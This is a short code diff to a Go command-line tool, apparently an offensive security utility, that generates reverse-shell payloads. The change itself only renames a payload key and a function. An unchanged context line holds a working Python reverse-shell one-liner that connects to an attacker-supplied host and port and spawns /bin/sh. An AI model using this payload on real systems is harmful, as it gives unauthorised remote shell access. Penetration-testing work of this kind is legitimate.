@@ -254,7 +254,7 @@ namespace ConnectBack
 		false,
 		"ps1",
 	},
-	"python-gen": {
+	"python": {
 		`python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<HOST>",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'`,
 		false,
 		"sh",
@@ -313,7 +313,7 @@ var payloadCmd = &cobra.Command{
 	Use:   "payload [TYPE]",
 	Short: "Generate a payload",
 	Long:  "Creates a file with the requested payload.",
-	Run: func(cmd *cobra.Command, args []string) {
+	Run: func(_ *cobra.Command, args []string) {
 		if len(args) < 1 {
 			fmt.Println(utils.Red + "No type was provided." + utils.Reset)
 			return
@@ -336,19 +336,19 @@ var payloadCmd = &cobra.Command{
 				Options: keys,
 				OnChoice: func(choice string) {
 					payloadLanguage = choice
-					genPayload(strings.ToLower(args[0]))
+					prepPayload(strings.ToLower(args[0]))
 				},
 				OnQuit: func() {
 					fmt.Println(utils.Red + "No language selected." + utils.Reset)
 				},
 			})
 		} else {
-			genPayload(strings.ToLower(args[0]))
+			prepPayload(strings.ToLower(args[0]))
 		}
 	},
 }
 
-func genPayload(payloadType string) {
+func prepPayload(payloadType string) {
 	if payloadType == "reverseshell" || payloadType == "rs" {
 		if val, ok := reverseShells[strings.ToLower(payloadLanguage)]; ok {
 			val.Payload = strings.Replace(strings.Replace(val.Payload, "<HOST>", payloadHost, 1), "<PORT>", payloadPort, 1)
